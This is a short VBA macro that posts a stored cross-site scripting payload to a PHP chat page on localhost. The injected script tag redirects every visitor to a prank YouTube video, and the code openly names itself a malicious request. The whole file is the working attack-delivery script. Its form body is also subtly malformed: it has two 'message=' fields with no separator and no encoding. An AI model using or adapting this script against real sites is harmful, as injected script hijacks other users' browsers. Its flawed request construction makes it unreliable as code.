Option Explicit

Sub SendMaliciousRequest()
    Dim http As Object
    Dim url As String
    Dim maliciousMessage As String
    Dim message As String
    Dim body As String
    
    ' Create an HTTP object to send the request
    Set http = CreateObject("MSXML2.XMLHTTP")
    
    ' URL of the vulnerable website
    url = "http://localhost/root/php/development.php"
    
    ' Craft the XSS payload: a simple redirect to a Rick Roll URL
    maliciousMessage = "<script>window.location='https://www.youtube.com/watch?v=dQw4w9WgXcQ';</script>"
    
    'Craft chat message
    message = "You just got rick-rolled!"
    
    ' Set up the form data to be submitted
    body = "message=" & maliciousMessage & "message=" & message
    
    ' Send the POST request to the server (this submits the malicious message)
    http.Open "POST", url, False
    http.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
    http.Send body

    ' Check for success
    If http.Status = 200 Then
        MsgBox "Malicious message sent successfully!", vbInformation
    Else
        MsgBox "Failed to send message. HTTP Status: " & http.Status, vbCritical
    End If
    
    ' Clean up
    Set http = Nothing
End Sub


